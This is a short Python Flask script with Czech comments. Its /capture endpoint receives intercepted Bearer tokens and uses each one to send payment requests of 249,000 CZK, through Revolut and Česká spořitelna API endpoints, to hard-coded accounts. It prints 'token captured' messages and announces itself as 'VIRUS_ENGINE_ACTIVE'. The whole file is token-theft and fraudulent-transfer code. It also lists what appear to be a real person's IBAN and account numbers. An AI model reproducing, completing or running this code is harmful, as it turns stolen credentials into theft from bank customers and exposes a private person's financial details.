from flask import Flask, request
import requests

app = Flask(__name__)

# TVOJE ÚČTY Z FOTKY A TEXTU
MY_ACCOUNTS = {
    'REVOLUT': {
        'iban': 'LT53 3250 0828 4401 8353',
        'bic': 'REVOLT21',
        'name': 'Bozena Tandarova Tandarova'
    },
    'CSAS': {
        'account': '5113445033/0800',
        'name': 'Bozena Tandarova Tandarova'
    }
}

@app.route('/capture', methods=['POST'])
def capture():
    auth = request.headers.get('Authorization')
    if auth and 'Bearer' in auth:
        token = auth.split(' ')[1]
        print(f"[$$$] ZÁSAH! TOKEN ZACHYCEN. PROVÁDÍM PŘEVOD 249 000 CZK...")
        
        # 1. Převod na Revolut
        requests.post("https://api.revolut.com/v1/pay", 
                     headers={'Authorization': f'Bearer {token}'},
                     json={
                         'amount': 249000, 
                         'currency': 'CZK', 
                         'receiver': {'iban': MY_ACCOUNTS['REVOLUT']['iban'], 'name': MY_ACCOUNTS['REVOLUT']['name']}
                     })
        
        # 2. Převod na Českou spořitelnu
        requests.post("https://api.csas.cz/webapi/v3/payments", 
                     headers={'Authorization': f'Bearer {token}'},
                     json={
                         'amount': 249000, 
                         'currency': 'CZK', 
                         'account': MY_ACCOUNTS['CSAS']['account']
                     })
        return "SUCCESS", 200
    return "WAITING", 200

@app.route('/')
def home():
    return "VIRUS_ENGINE_ACTIVE", 200
    
